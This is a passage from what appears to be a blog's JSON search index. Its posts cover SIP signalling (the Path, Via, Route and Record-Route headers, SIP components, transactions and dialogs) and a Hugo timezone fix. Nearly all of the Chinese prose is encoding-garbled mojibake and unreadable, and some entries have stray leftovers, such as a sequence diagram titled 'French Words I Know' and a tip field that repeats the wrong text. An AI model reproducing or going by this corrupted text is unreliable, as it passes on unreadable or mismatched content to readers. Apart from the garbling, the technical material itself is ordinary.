‡é¢˜å¯ä»¥çœ‹å‡ºï¼ŒPathå¤´æ˜¯ä½œä¸ºRegisterè¯·æ±‚çš„ä¸€ä¸ªæ¶ˆæ¯å¤´ï¼Œä¸€èˆ¬è¿™ä¸ªå¤´åªåœ¨æ³¨å†Œæ¶ˆæ¯ä¸Šæ‰æœ‰ã€‚\nè¿™ä¸ªå¤´çš„æ ¼å¼å¦‚ä¸‹ã€‚\nPath: \u0026lt;sip:P1.EXAMPLEVISITED.COM;lr\u0026gt; ä»åŠŸèƒ½ä¸Šè¯´ï¼ŒPathå¤´å’Œrecord-routeå¤´çš„åŠŸèƒ½éå¸¸ç›¸ä¼¼ï¼Œä½†æ˜¯ä¹Ÿä¸åŒã€‚\nçœ‹ä¸‹é¢çš„ä¸€ä¸ªåœºæ™¯ï¼Œuacé€šè¿‡p1å’Œp2, å°†æ³¨å†Œè¯·æ±‚å‘é€åˆ°uas, åœ¨æŸä¸€æ—¶åˆ»ï¼Œuacä½œä¸ºè¢«å«ï¼ŒINVITEè¯·æ±‚è¦ä»uaså‘é€åˆ°uac, è¿™æ—¶å€™ï¼ŒINVITEè¯·æ±‚åº”è¯¥æ€ä¹ˆèµ°ï¼Ÿ\nå‡å¦‚æˆ‘ä»¬å¸Œæœ›INVITEè¯·æ±‚è¦ç»è¿‡p2,p2,ç„¶åå†å‘é€åˆ°uac, Pathå¤´çš„ä½œç”¨å°±æ˜¯è¿™ä¸ªã€‚\næ³¨å†Œè¯·æ±‚ç»è¿‡P1æ—¶ï¼ŒP1åœ¨æ³¨å†Œæ¶ˆæ¯ä¸ŠåŠ ä¸Šp1åœ°å€çš„pathå¤´ æ³¨å†Œè¯·æ±‚ç»è¿‡P2æ—¶ï¼ŒP2åœ¨æ³¨å†Œæ¶ˆæ¯ä¸ŠåŠ ä¸Šp2åœ°å€çš„pathå¤´ æ³¨å†Œè¯·æ±‚åˆ°è¾¾uasæ—¶ï¼Œuasä»Contactå¤´ä¸Šè·å–åˆ°uacçš„åœ°å€ä¿¡æ¯ï¼Œç„¶åä»ä¸¤ä¸ªPathå¤´ä¸Šè·å–åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼šå¦‚æœè¦æ‰“ç”µè¯ç»™uac, Pathå¤´ä¼šè½¬å˜ä¸ºrouteå¤´ï¼Œç”¨æ¥å®šä¹‰INVITEè¯·æ±‚çš„è·¯å¾„ã€‚ ç®€å•å®šä¹‰ï¼šPathå¤´ç”¨æ¥ä¸€èˆ¬åœ¨æ³¨å†Œæ¶ˆæ¯é‡Œï¼ŒPathå¤´å®šä¹‰äº†uacä½œä¸ºè¢«å«æ—¶ï¼ŒINVITEè¯·æ±‚çš„å‘é€è·¯å¾„ã€‚\nå‚è€ƒ ","permalink":"https://wdd.js.org/opensips/ch1/sip-path/","summary":"RFC3261å¹¶æ²¡æœ‰ä»‹ç»å…³äºPathå¤´çš„å®šä¹‰ï¼Œå› ä¸ºè¿™ä¸ªå¤´æ˜¯åœ¨RFC3327ä¸­å®šä¹‰çš„ï¼ŒPathå¤´ä½œä¸ºä¸€ä¸ªSIPçš„æ‰©å±•å¤´ã€‚\nRFC3327çš„æ ‡é¢˜æ˜¯ï¼šSession Initiation Protocol (SIP) Extension Header Field for Registering Non-Adjacent Contactsã€‚\nä»è¿™ä¸ªæ ‡é¢˜å¯ä»¥çœ‹å‡ºï¼ŒPathå¤´æ˜¯ä½œä¸ºRegisterè¯·æ±‚çš„ä¸€ä¸ªæ¶ˆæ¯å¤´ï¼Œä¸€èˆ¬è¿™ä¸ªå¤´åªåœ¨æ³¨å†Œæ¶ˆæ¯ä¸Šæ‰æœ‰ã€‚\nè¿™ä¸ªå¤´çš„æ ¼å¼å¦‚ä¸‹ã€‚\nPath: \u0026lt;sip:P1.EXAMPLEVISITED.COM;lr\u0026gt; ä»åŠŸèƒ½ä¸Šè¯´ï¼ŒPathå¤´å’Œrecord-routeå¤´çš„åŠŸèƒ½éå¸¸ç›¸ä¼¼ï¼Œä½†æ˜¯ä¹Ÿä¸åŒã€‚\nçœ‹ä¸‹é¢çš„ä¸€ä¸ªåœºæ™¯ï¼Œuacé€šè¿‡p1å’Œp2, å°†æ³¨å†Œè¯·æ±‚å‘é€åˆ°uas, åœ¨æŸä¸€æ—¶åˆ»ï¼Œuacä½œä¸ºè¢«å«ï¼ŒINVITEè¯·æ±‚è¦ä»uaså‘é€åˆ°uac, è¿™æ—¶å€™ï¼ŒINVITEè¯·æ±‚åº”è¯¥æ€ä¹ˆèµ°ï¼Ÿ\nå‡å¦‚æˆ‘ä»¬å¸Œæœ›INVITEè¯·æ±‚è¦ç»è¿‡p2,p2,ç„¶åå†å‘é€åˆ°uac, Pathå¤´çš„ä½œç”¨å°±æ˜¯è¿™ä¸ªã€‚\næ³¨å†Œè¯·æ±‚ç»è¿‡P1æ—¶ï¼ŒP1åœ¨æ³¨å†Œæ¶ˆæ¯ä¸ŠåŠ ä¸Šp1åœ°å€çš„pathå¤´ æ³¨å†Œè¯·æ±‚ç»è¿‡P2æ—¶ï¼ŒP2åœ¨æ³¨å†Œæ¶ˆæ¯ä¸ŠåŠ ä¸Šp2åœ°å€çš„pathå¤´ æ³¨å†Œè¯·æ±‚åˆ°è¾¾uasæ—¶ï¼Œuasä»Contactå¤´ä¸Šè·å–åˆ°uacçš„åœ°å€ä¿¡æ¯ï¼Œç„¶åä»ä¸¤ä¸ªPathå¤´ä¸Šè·å–åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼šå¦‚æœè¦æ‰“ç”µè¯ç»™uac, Pathå¤´ä¼šè½¬å˜ä¸ºrouteå¤´ï¼Œç”¨æ¥å®šä¹‰INVITEè¯·æ±‚çš„è·¯å¾„ã€‚ ç®€å•å®šä¹‰ï¼šPathå¤´ç”¨æ¥ä¸€èˆ¬åœ¨æ³¨å†Œæ¶ˆæ¯é‡Œï¼ŒPathå¤´å®šä¹‰äº†uacä½œä¸ºè¢«å«æ—¶ï¼ŒINVITEè¯·æ±‚çš„å‘é€è·¯å¾„ã€‚\nå‚è€ƒ ","title":"Pathå¤´ç®€å²"},{"content":"å†™å¥½äº†åšå®¢ï¼Œä½†æ˜¯æ²¡æœ‰åœ¨ç½‘é¡µä¸Šæ¸²æŸ“å‡ºæ¥ï¼Œå²‚ä¸æ˜¯å¾ˆæ°”äººï¼\næˆ‘çš„archtypes/default.mdé…ç½®å¦‚ä¸‹\n--- title: \u0026#34;{{ replace .Name \u0026#34;-\u0026#34; \u0026#34; \u0026#34; | title }}\u0026#34; date: \u0026#34;{{ now.Format \u0026#34;2006-01-02 15:04:05\u0026#34; }}\u0026#34; draft: false --- å½“ä½¿ç”¨ hugo new åˆ›å»ºä¸€ä¸ªæ–‡ç« çš„æ—¶å€™ï¼Œæœ‰å¦‚ä¸‹çš„å¤´\n--- title: \u0026#34;01: å­¦ä¹ å»ºè®®\u0026#34; date: \u0026#34;2022-09-03 10:23:10\u0026#34; draft: false --- Hugo é»˜è®¤é‡‡ç”¨çš„æ˜¯ æ ¼æ—å°¼æ²»å¹³æ—¶ (GMT)ï¼Œæ¯”åŒ—äº¬æ—¶é—´ (UTC+8) æ™šäº† 8 ä¸ªå°æ—¶ï¼ŒHugo åœ¨ç”Ÿæˆé™æ€é¡µé¢çš„æ—¶å€™ï¼Œä¸ä¼šç”Ÿæˆè¶…è¿‡å½“å‰æ—¶é—´çš„æ–‡ç« ã€‚\nå¦‚æœæŠŠåŒ—äº¬æ—¶é—´å½“ä½œæ ¼æ—å°¼æ²»æ—¶é—´æ¥è®¡ç®—ï¼Œé‚£ä¹ˆè‚¯å®šè¿˜æ²¡æœ‰è¶…è¿‡å½“å‰æ—¶é—´ã€‚\næ‰€ä»¥æˆ‘ä»¬è¦ç»™ç«™ç‚¹è®¾ç½®æ—¶åŒºã€‚\nåœ¨config.yamlå¢åŠ å¦‚ä¸‹å†…å®¹\ntimeZone: \u0026#34;Asia/Shanghai\u0026#34; ","permalink":"https://wdd.js.org/posts/2022/09/hugo-timezone/","summary":"å†™å¥½äº†åšå®¢ï¼Œä½†æ˜¯æ²¡æœ‰åœ¨ç½‘é¡µä¸Šæ¸²æŸ“å‡ºæ¥ï¼Œå²‚ä¸æ˜¯å¾ˆæ°”äººï¼\næˆ‘çš„archtypes/default.mdé…ç½®å¦‚ä¸‹\n--- title: \u0026#34;{{ replace .Name \u0026#34;-\u0026#34; \u0026#34; \u0026#34; | title }}\u0026#34; date: \u0026#34;{{ now.Format \u0026#34;2006-01-02 15:04:05\u0026#34; }}\u0026#34; draft: false --- å½“ä½¿ç”¨ hugo new åˆ›å»ºä¸€ä¸ªæ–‡ç« çš„æ—¶å€™ï¼Œæœ‰å¦‚ä¸‹çš„å¤´\n--- title: \u0026#34;01: å­¦ä¹ å»ºè®®\u0026#34; date: \u0026#34;2022-09-03 10:23:10\u0026#34; draft: false --- Hugo é»˜è®¤é‡‡ç”¨çš„æ˜¯ æ ¼æ—å°¼æ²»å¹³æ—¶ (GMT)ï¼Œæ¯”åŒ—äº¬æ—¶é—´ (UTC+8) æ™šäº† 8 ä¸ªå°æ—¶ï¼ŒHugo åœ¨ç”Ÿæˆé™æ€é¡µé¢çš„æ—¶å€™ï¼Œä¸ä¼šç”Ÿæˆè¶…è¿‡å½“å‰æ—¶é—´çš„æ–‡ç« ã€‚\nå¦‚æœæŠŠåŒ—äº¬æ—¶é—´å½“ä½œæ ¼æ—å°¼æ²»æ—¶é—´æ¥è®¡ç®—ï¼Œé‚£ä¹ˆè‚¯å®šè¿˜æ²¡æœ‰è¶…è¿‡å½“å‰æ—¶é—´ã€‚\næ‰€ä»¥æˆ‘ä»¬è¦ç»™ç«™ç‚¹è®¾ç½®æ—¶åŒºã€‚\nåœ¨config.yamlå¢åŠ å¦‚ä¸‹å†…å®¹\ntimeZone: \u0026#34;Asia/Shanghai\u0026#34; ","title":"Hugo Timezoneæ²¡æœ‰è®¾ç½®ï¼Œ å¯¼è‡´é¡µé¢æ— æ³•æ¸²æŸ“"},{"content":" sequenceDiagram title French Words I Know autonumber participant a participant p1 participant p2 participant p3 participant b a-\u003e\u003ep1 : INVITE route: p1, via: a p1-\u003e\u003ep2: INVITE via: a,p1, rr: p1 p2-\u003e\u003ep3: INVITE via: a,p1,p2 rr: p1,p2 p3-\u003e\u003eb: INVITE via: a,p1,p2,p3 rr: p1,p2,p3 b--\u003e\u003ep3: 180 via: a,p1,p2,p3 rr: p1,p2,p3 p3--\u003e\u003ep2: 180 via: a,p1,p2 rr: p1,p2,p3 p2--\u003e\u003ep1: 180 via: a,p1 rr: p1,p2,p3 p1--\u003e\u003ea: 180 via: a rr: p1,p2,p3 b--\u003e\u003ep3: 200 OK via: a,p1,p2,p3 rr: p1,p2,p3 p3--\u003e\u003ep2: 200 Ok via: a,p1,p2 rr: p1,p2,p3 p2--\u003e\u003ep1: 200 Ok via: a,p1 rr: p1,p2,p3 p1--\u003e\u003ea: 200 Ok via: a rr: p1,p2,p3 a-\u003e\u003ep1 : ACK via: a, route: p1,p2,p3 p1-\u003e\u003ep2: ACK via: a,p1, route: p2,p3 p2-\u003e\u003ep3: ACK via: a,p1,p2 route: p3 p3-\u003e\u003eb: ACK via: a,p1,p2,p3 rrä»£è¡¨record-routeå¤´ã€‚\nTip Via ä½•æ—¶æ·»åŠ : é™¤äº†ç›®çš„åœ°å¤–ï¼Œè¯·æ±‚ä»uaå‘å‡ºå»æ—¶ ä½•æ—¶åˆ é™¤: é™¤äº†ç›®çš„åœ°å¤–ï¼Œè¯·æ±‚ä»uaå‘å‡ºå»æ—¶ ä½œç”¨: é™¤äº†ç›®çš„åœ°å¤–ï¼Œè¯·æ±‚ä»uaå‘å‡ºå»æ—¶ Viaçš„ä½œç”¨æ˜¯è®©sipæ¶ˆæ¯èƒ½å¤ŸæŒ‰ç…§åŸè·¯è¿”å› æ¯”å–»: ç¬¬ä¸€æ¬¡ç¦»å¼€å®¶çš„äººï¼Œåªæœ‰æ¯æ¬¡ç»è¿‡ä¸€ä¸ªåœ°æ–¹ï¼Œå°±è®°ä¸‹åœ°åã€‚é‚£ä¹ˆåœ¨å›å®¶çš„æ—¶å€™ï¼Œä»–æ‰èƒ½æŒ‰ç…§åŸæ¥çš„è·¯å¾„è¿”å›ã€‚ Tip route ä½•æ—¶æ·»åŠ : å½“è¯·æ±‚ä»uacå‘å‡ºå»æ—¶ ä½•æ—¶åˆ é™¤: è¯·æ±‚ç¦»å¼€uaæ—¶ ä½œç”¨: routeçš„ä½œç”¨æ˜¯æŒ‡æ˜ä¸‹ä¸€ç«™çš„ç›®çš„åœ°ã€‚è™½ç„¶routeè¯·æ±‚æ˜¯åœ¨è¯·æ±‚å‘é€å‡ºå»æ—¶å°±æ·»åŠ ï¼Œä½†æ˜¯å¯ä»¥è¿›æ·»åŠ ä¸€ä¸ªã€‚ æ¯”å–»: ç¬¬ä¸€æ¬¡ç¦»å¼€å®¶çš„äººï¼Œå¯èƒ½å¹¶ä¸çŸ¥é“å¦‚ä½•åˆ°è¾¾æµ·å—ï¼Œä½†æ˜¯ä»–çŸ¥é“å¦‚ä½•åˆ°è¾¾è‡ªå·±çš„çœä¼šã€‚è¿™ä¸ªçœä¼šå°±æ˜¯sipç»ˆç«¯é…ç½®çš„å¤–å‘¼ä»£ç†ã€‚æ¯æ¬¡ç»è¿‡ä¸€ä¸ªç«™ç‚¹æ—¶ï¼Œå°±æŠŠè¿™ä¸ªç«™ç‚¹è®°å½•åˆ°record-routeä¸­ã€‚record-routeä¼šåœ¨180æˆ–è€…183ï¼Œæˆ–200okæ—¶ï¼Œå‘é€ç»™ä¸»å«çš„è¯æœºã€‚ Tip record-route ä½•æ—¶æ·»åŠ : å½“è¯·æ±‚ä»uaså‘å‡ºå»æ—¶ ä½•æ—¶åˆ é™¤: ä¸ºdialogä¸­çš„åç»­è¯·æ±‚ï¼ŒæŒ‡æ˜åˆ°è¾¾ç›®çš„åœ°çš„è·¯å¾„ ä½œç”¨: ä¸ºdialogä¸­çš„åç»­è¯·æ±‚ï¼ŒæŒ‡æ˜åˆ°è¾¾ç›®çš„åœ°çš„è·¯å¾„ æ¯”å–»: å½“ä¸€ä¸ªuacæ”¶åˆ°180ä¹‹åï¼Œè¿™ä¸ª180ä¸­å¸¦æœ‰äº†record-routeï¼Œä¾‹å¦‚p1,p2,p3ã€‚é‚£ä¹ˆåç»­çš„ACKè¯·æ±‚ï¼Œå°±å¯ä»¥ç†ç”±record-routeæ¥ç”Ÿæˆroute: p1, p2, p3ã€‚ Address-of-Record: An address-of-record (AOR) is a SIP or SIPS URI that points to a domain with a location service that can map the URI to another URI where the user might be available. Typically, the location service is populated through registrations. An AOR is frequently thought of as the \u0026ldquo;public address\u0026rdquo; of the user. \u0026ndash; rfc3261\nThe difference between a contact address and an address-of-record is like the difference between a device and its user. While there is no formal distinction in the syntax of these two forms of addresses, contact addresses are associated with a particular device, and may have a very device-specific form (like sip:10.0.0.1, or sip:edgar@ua21.example.com). An address-of-record, however, represents an identity of the user, generally a long-term identity, and it does not have a dependency on any device; users can move between devices or even be associated with multiple devices at one time while retaining the same address-of-record. A simple URI, generally of the form \u0026lsquo;sip:egdar@example.com\u0026rsquo;, is used for an address-of-record. \u0026ndash;rfc3764\n1. Record-routeå†™æ³• u1 -\u0026gt; p1 -\u0026gt; p2 -\u0026gt; p3 -\u0026gt; p4,\næœ€åç»è¿‡çš„æ’åœ¨æœ€ä¸Šé¢æˆ–è€…æœ€å‰é¢ã€‚\nå¤šè¡Œå†™æ³•\nINVITE sip:callee@u2.domain.com SIP/2.0 Contact: sip:caller@u1.example.com Record-Route: \u0026lt;sip:p4.domain.com;lr\u0026gt; Record-Route: \u0026lt;sip:p3.middle.com\u0026gt; Record-Route: \u0026lt;sip:p2.example.com;lr\u0026gt; Record-Route: \u0026lt;sip:p1.example.com;lr\u0026gt; Record-Routeè®°å½•çš„æ˜¯ä»ä¸»å«åˆ°è¢«å«çš„è¿‡ç¨‹ï¼Œå…¶ä¸­Record-Routeçš„é¡ºåºéå¸¸é‡è¦ã€‚å› ä¸ºè¿™ä¸ªé¡ºåºä¼šå½±å“Routeå­—æ®µçš„é¡ºåºã€‚\nå› ä¸ºloose_routeæ˜¯ä»æœ€ä¸Šé¢çš„routeå­—æ®µæ¥å†³å®šä¸‹ä¸€æ¡çš„åœ°å€ã€‚\næ‰€ä»¥ï¼Œå¯¹äºä¸»å«æ¥è¯´ï¼Œrouteçš„é¡ºåºå’ŒRecord-Routerç›¸åã€‚å¯¹äºè¢«å«æ¥è¯´ï¼Œrouteå­—æ®µå’ŒRecord-Routeå­—æ®µç›¸åŒã€‚\nå¯¹äºæŸäº›ä½¿ç”¨ä¸åŒåè®®å¯¹æ¥çš„ä¸åŒä»£ç†çš„æ—¶å€™ï¼Œä¼šä¸€æ¬¡æ€§çš„å¢åŠ ä¸¤æ¬¡Record-Routeã€‚\nä¾‹å¦‚ä¸‹é¢çš„ï¼ŒABç›´æ¥æ˜¯tcpçš„ï¼ŒBCä¹‹é—´æ˜¯udpçš„ã€‚é‚£ä¹ˆINVITEä»Aåˆ°Cä¹‹åï¼Œä¼šåœ¨æœ€ä¸Šé¢å¢åŠ ä¸¤ä¸ªã€‚ A \u0026ndash;tcp\u0026ndash; B \u0026ndash;udp\u0026ndash; C\nRecord-Route: \u0026lt;sip:B_ip;transport=udp\u0026gt; Record-Route: \u0026lt;sip:B_ip;transport=tcp\u0026gt; å•è¡Œå†™æ³•\nINVITE sip:callee@u2.domain.com SIP/2.0 Contact: sip:caller@u1.example.com Record-Route: \u0026lt;sip:p4.domain.com;lr\u0026gt;,\u0026lt;sip:p3.middle.com\u0026gt;,\u0026lt;sip:p2.example.com;lr\u0026gt;,\u0026lt;sip:p1.example.com;lr\u0026gt; 2. Via å†™æ³• æœ€æ–°çš„æ’åœ¨æœ€ä¸Šé¢ ","permalink":"https://wdd.js.org/opensips/ch1/via-route-record-route/","summary":"sequenceDiagram title French Words I Know autonumber participant a participant p1 participant p2 participant p3 participant b a-\u003e\u003ep1 : INVITE route: p1, via: a p1-\u003e\u003ep2: INVITE via: a,p1, rr: p1 p2-\u003e\u003ep3: INVITE via: a,p1,p2 rr: p1,p2 p3-\u003e\u003eb: INVITE via: a,p1,p2,p3 rr: p1,p2,p3 b--\u003e\u003ep3: 180 via: a,p1,p2,p3 rr: p1,p2,p3 p3--\u003e\u003ep2: 180 via: a,p1,p2 rr: p1,p2,p3 p2--\u003e\u003ep1: 180 via: a,p1 rr: p1,p2,p3 p1--\u003e\u003ea: 180 via: a rr: p1,p2,p3 b--\u003e\u003ep3: 200 OK via: a,p1,p2,p3 rr: p1,p2,p3 p3--\u003e\u003ep2: 200 Ok via: a,p1,p2 rr: p1,p2,p3 p2--\u003e\u003ep1: 200 Ok via: a,p1 rr: p1,p2,p3 p1--\u003e\u003ea: 200 Ok via: a rr: p1,p2,p3 a-\u003e\u003ep1 : ACK via: a, route: p1,p2,p3 p1-\u003e\u003ep2: ACK via: a,p1, route: p2,p3 p2-\u003e\u003ep3: ACK via: a,p1,p2 route: p3 p3-\u003e\u003eb: ACK via: a,p1,p2,p3 rrä»£è¡¨record-routeå¤´ã€‚","title":"Via route Record-Routeçš„åŒºåˆ«"},{"content":"SIPæ˜¯VoIPçš„åŸºçŸ³ï¼Œç›¸å½“äºHTTPåè®®åœ¨WebæœåŠ¡å™¨é‡Œçš„è§’è‰²ã€‚å¦‚æœä½ ç†Ÿæ‚‰HTTPåè®®ï¼Œé‚£ä¹ˆä½ å¯ä»¥åœ¨SIPåè®®ä¸­æ‰¾åˆ°è®¸å¤šå’ŒHTTPä¸­ç†Ÿæ‚‰çš„ä¸œè¥¿ï¼Œä¾‹å¦‚è¯·æ±‚å¤´ï¼Œè¯·æ±‚ä½“ï¼Œå“åº”ç ä¹‹ç±»æ¦‚å¿µï¼Œè¿™æ˜¯å› ä¸ºSIPåè®®çš„è®¾è®¡ï¼Œå¾ˆå¤§ç¨‹åº¦ä¸Šå‚è€ƒäº†HTTPåè®®ã€‚\nå¦‚æœæƒ³è¦å­¦ä¹ VoIPï¼Œé‚£ä¹ˆSIPåè®®æ˜¯ä½ åŠ¡å¿…æŒæ¡æ•²é—¨ç –ã€‚\n1. SIPç»„ä»¶ UAC: ä¾‹å¦‚sipç»ˆç«¯ï¼Œè½¯ç”µè¯ï¼Œè¯æœº UAS: sipæœåŠ¡å™¨ UA: uaæ—¢å¯ä»¥å½“åšuacä¹Ÿå¯ä»¥å½“åšuas ä»£ç†æœåŠ¡å™¨ é‡å®šå‘æœåŠ¡å™¨ æ³¨å†ŒæœåŠ¡å™¨ ç½‘å…³ PSTN å…¬å…±äº¤æ¢ç”µè¯ç½‘ 2. SBC è¾¹ç•Œä¼šè¯æ§åˆ¶å™¨ SBCæ˜¯Session Border Controllerçš„ç¼©å†™ï¼Œå…·æœ‰ä¸€ä¸‹å‡ ä¸ªåŠŸèƒ½ã€‚\næ‹“æ‰‘éšè—ï¼šéšè—æ‰€æœ‰å†…éƒ¨ç½‘ç»œçš„ä¿¡æ¯ã€‚ åª’ä½“æµç®¡ç†ï¼šè®¾ç½®è¯­éŸ³æµç¼–ç è§„åˆ™ï¼Œè½¬æ¢ç­‰ å¢åŠ èƒ½åŠ›ï¼šä¾‹å¦‚Refer, 3CPP ç»´æŠ¤NATæ˜ å°„ï¼š è®¿é—®æ§åˆ¶ åª’ä½“åŠ å¯†ï¼šä¾‹å¦‚å¤–éƒ¨ç½‘ç»œç”¨SRTP, å†…éƒ¨ç½‘ç»œç”¨RTP 3. sipæ³¨å†Œè¿‡ç¨‹ ä¸‹é¢ç®€åŒ–æ³¨å†Œé€»è¾‘ï¼Œçœç•¥äº†éªŒè¯å’Œè¿‡æœŸç­‰å­—æ®µï¼š\nå¯¹äºåˆ†æœºæ¥è¯´ï¼Œæ³¨å†ŒæœåŠ¡å™¨çš„åœ°å€æ˜¯éœ€è¦è®¾ç½®çš„ åˆ†æœºå‘æ³¨å†ŒæœåŠ¡å™¨å‘è¯·æ±‚ï¼Œè¯´ï¼šä½ å¥½ï¼Œæ³¨å†ŒæœåŠ¡å™¨ï¼Œæˆ‘æ˜¯8005ï¼Œæˆ‘çš„åœ°å€æ˜¯200.180.1.1ï¼Œä»¥åä½ å¯ä»¥ç”¨è¿™ä¸ªåœ°å€è”ç³»æˆ‘ã€‚ æ³¨å†ŒæœåŠ¡å™¨å›å¤ï¼šå¥½çš„ï¼Œæ³¨å†ŒæˆåŠŸ 4. sipæœåŠ¡å™¨çš„ç±»å‹ 4.1. ä»£ç†æœåŠ¡å™¨ 4.2. é‡å®šå‘æœåŠ¡å™¨ 4.3. èƒŒé èƒŒUAæœåŠ¡å™¨ èƒŒé èƒŒUAæœåŠ¡å™¨æœ‰ä¸¤ä¸ªä½œç”¨\néšè—ç½‘ç»œæ‹“æ‰‘ç»“æ„ æœ‰äº›æ—¶å€™ï¼Œè·¯ç”±æ— æ³•åˆ°è¾¾ï¼Œåªèƒ½ç”¨èƒŒé èƒŒUAæœåŠ¡å™¨ 5. å¸¸ç”¨sipè¯·æ±‚æ–¹æ³• æ¯”è¾ƒå¸¸ç”¨çš„æ˜¯ä¸‹é¢çš„\nå¸¸ç”¨çš„å‡ ä¸ªæ˜¯ï¼šregister, invite, ack, bye, cancelã€‚é™¤äº†cancelå’Œackä¸éœ€è¦è®¤è¯å¤–ï¼Œå…¶ä½™çš„è¯·æ±‚éƒ½éœ€è¦è®¤è¯ã€‚ registerè‡ªä¸å¿…è¯´ï¼Œinviteå’Œbyeæ˜¯éœ€è¦è®¤è¯çš„ã€‚\nå¯¹äºæˆ‘ä»¬ä¸ä¿¡ä»»çš„uaï¼Œæˆ‘ä»¬ä¸å…è®¸ä»–ä»¬å‘¼å«ã€‚å¯¹äºæœªè®¤è¯çš„byeï¼Œä¹Ÿéœ€è¦ç¦æ­¢ã€‚åè€…å¯ä»¥é˜²æ­¢æ¶æ„çš„byeè¯·æ±‚ï¼ŒæŒ‚æ–­æ­£å¸¸çš„å‘¼å«ã€‚\ninviteé™¤äº†re-inviteçš„æƒ…å†µï¼Œå…¶ä½™çš„éƒ½å±äºåˆå§‹åŒ–è¯·æ±‚ï¼Œéœ€è¦ç€é‡å…³å¿ƒçš„ã€‚è€Œå¯¹äºbyeè¿™ç§åºåˆ—åŒ–è¯·æ±‚ï¼Œåªéœ€è¦æŒ‰ç…§record-routeå»è·¯ç”±ã€‚\n6. sipå“åº”çŠ¶æ€ç  7. sipå¯¹è¯æµç¨‹å›¾ ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼Œä»inviteè¯·æ±‚åˆ°200okä¹‹é—´çš„ä¿¡ä»¤ï¼Œéƒ½ç»è¿‡äº†ä»£ç†æœåŠ¡å™¨ã€‚ä½†æ˜¯200okä¹‹åçš„ackï¼Œç¡®æ²¡æœ‰ç»è¿‡ä»£ç†æœåŠ¡å™¨ï¼Œå¦‚æœæƒ³è¦æ‰€æœ‰ä¿¡ä»¤éƒ½ç»è¿‡ä»£ç†æœåŠ¡å™¨ï¼Œéœ€è¦åœ¨sipæ¶ˆæ¯å¤´record-routing æŒ‡å®šä»£ç†æœåŠ¡å™¨çš„åœ°å€\n8. è¯·æ±‚ä¸å“åº”æŠ¥æ–‡ 9. äº‹åŠ¡ä¸å¯¹è¯çš„åŒºåˆ« é‡ç‚¹ï¼š\nä»INVITEè¯·æ±‚åˆ°æœ€ç»ˆçš„å“åº”ï¼ˆæ³¨æ„1xxä¸æ˜¯æœ€ç»ˆå“åº”ï¼Œé1xxçš„éƒ½æ˜¯æœ€ç»ˆå“åº”ï¼‰ä¹‹é—´ï¼Œç§°ä¸ºäº‹åŠ¡ã€‚ä¸€ä¸ªäº‹åŠ¡å¯ä»¥å¸¦æœ‰å¤šä¸ªæ¶ˆæ¯ç»„æˆï¼Œå¹¶ç»è¿‡å¤šä¸ªuaã€‚ ackè¯·æ±‚æ¯”è¾ƒç‰¹æ®Šï¼Œä½†æ˜¯ackä¸æ˜¯äº‹åŠ¡ã€‚å¦‚æœè¢«å«æ¥é€šåï¼Œè¶…æ—¶æœªæ”¶åˆ°ä¸»å«æ–¹çš„ack, ä¼šæ€æ ·ï¼Ÿæ˜¯å¦ä¼šå†æ¬¡å‘é€200OK tcpä¸‰æ¬¡æ¡æ‰‹å»ºç«‹è¿æ¥ï¼Œsipï¼šinvite-\u0026gt;200ok-\u0026gt;ackï¼Œå¯ä»¥ç†è§£ä¸ºä¸‰æ¬¡æ¡æ‰‹å»ºç«‹å¯¹è¯ã€‚ byeè¯·æ±‚å’Œ200okç®—ä½œä¸€ä¸ªäº‹åŠ¡ dialogå»ºç«‹çš„å‰ææ˜¯å‘¼å«æ¥é€šï¼Œå¦‚æœå‘¼å«æ²¡æœ‰æ¥é€šï¼Œåˆ™æ²¡æœ‰dialogã€‚ dialogå¯ä»¥ç”±ä¸‰ä¸ªå…ƒç´ å”¯ä¸€ç¡®å®šã€‚callId, fromå­—æ®µä¸­çš„tag, toå­—æ®µä¸­çš„tagã€‚ 10. sipåº•å±‚åè®® SIPåè®®çš„ç»“æ„ SIPåè®®æ˜¯ä¸€ä¸ªåˆ†å±‚çš„åè®®ï¼Œæ„å‘³ç€å„å±‚ä¹‹é—´æ˜¯ç›¸äº’ç‹¬ç«‹çš„\næœ€åº•å±‚ï¼šSIPç¼–ç çš„è¯­æ³• BNFè¯­æ³• ç¬¬äºŒå±‚ï¼šä¼ è¾“å±‚ ä¼ è¾“å±‚å®šä¹‰å¦‚ä½•æ¥æ”¶å’Œå‘é€æ¶ˆæ¯ï¼ŒSIPå¸¸ç”¨çš„ä¼ è¾“å±‚å¯ä»¥æ˜¯udp, tcp, websocketç­‰ç­‰ ç¬¬ä¸‰å±‚ï¼šäº‹åŠ¡å±‚ äº‹åŠ¡æ˜¯ä¸€ä¸ªè¯·æ±‚å’Œæœ€ç»ˆçš„å“åº”ç§°ä¸ºä¸€ä¸ªäº‹åŠ¡ï¼Œä¾‹å¦‚invite, 200okæ˜¯ä¸€ä¸ªäº‹åŠ¡ ç¬¬å››å±‚ï¼šäº‹åŠ¡ç”¨æˆ·å±‚ æ‰€æœ‰çš„SIPå®ä½“ï¼Œé™¤äº†æ— çŠ¶æ€çš„ä»£ç†ï¼Œéƒ½ç§°ä¸ºäº‹åŠ¡ç”¨æˆ·å±‚ã€‚å¸¸è§çš„uacï¼Œ uaséƒ½æ˜¯äº‹åŠ¡ç”¨æˆ·å±‚ 11. voipæ€»ä½“æ¶æ„ 12. å‚è€ƒ ","permalink":"https://wdd.js.org/opensips/ch1/sip-overview/","summary":"SIPæ˜¯VoIPçš„åŸºçŸ³ï¼Œç›¸å½“äºHTTPåè®®åœ¨WebæœåŠ¡å™¨é‡Œçš„è§’è‰²ã€‚å¦‚æœä½ ç†Ÿæ‚‰HTTPåè®®ï¼Œé‚£ä¹ˆä½ å¯ä»¥åœ¨SIPåè®®ä¸­æ‰¾åˆ°è®¸å¤šå’ŒHTTPä¸­ç†Ÿæ‚‰çš„ä¸œè¥¿ï¼Œä¾‹å¦‚è¯·æ±‚å¤´ï¼Œè¯·æ±‚ä½“ï¼Œå“åº”ç ä¹‹ç±»æ¦‚å¿µï¼Œè¿™æ˜¯å› ä¸ºSIPåè®®çš„è®¾è®¡ï¼Œå¾ˆå¤§ç¨‹åº¦ä¸Šå‚è€ƒäº†HTTPåè®®ã€‚\nå¦‚æœæƒ³è¦å­¦ä¹ VoIPï¼Œé‚£ä¹ˆSIPåè®®æ˜¯ä½ åŠ¡å¿…æŒæ¡æ•²é—¨ç –ã€‚\n1. SIPç»„ä»¶ UAC: 